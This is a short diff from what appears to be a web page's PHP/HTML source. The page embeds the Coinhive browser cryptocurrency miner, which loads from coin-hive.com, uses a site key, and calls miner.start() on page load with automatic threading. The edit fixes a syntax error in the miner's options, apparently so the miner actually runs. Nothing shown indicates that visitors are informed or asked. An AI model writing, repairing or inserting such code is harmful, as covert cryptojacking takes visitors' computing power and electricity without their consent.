@@ -73,7 +73,7 @@ echo "<script type='text/javascript' src='/scripts/main.js'></script>";
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
 	var miner = new CoinHive.Anonymous('GIoaIxGbl6vKvaabbiDkxGKfl5QfYmjv', {
-        autoThreads: true;
+        autoThreads: true
     });
 	miner.start();
 
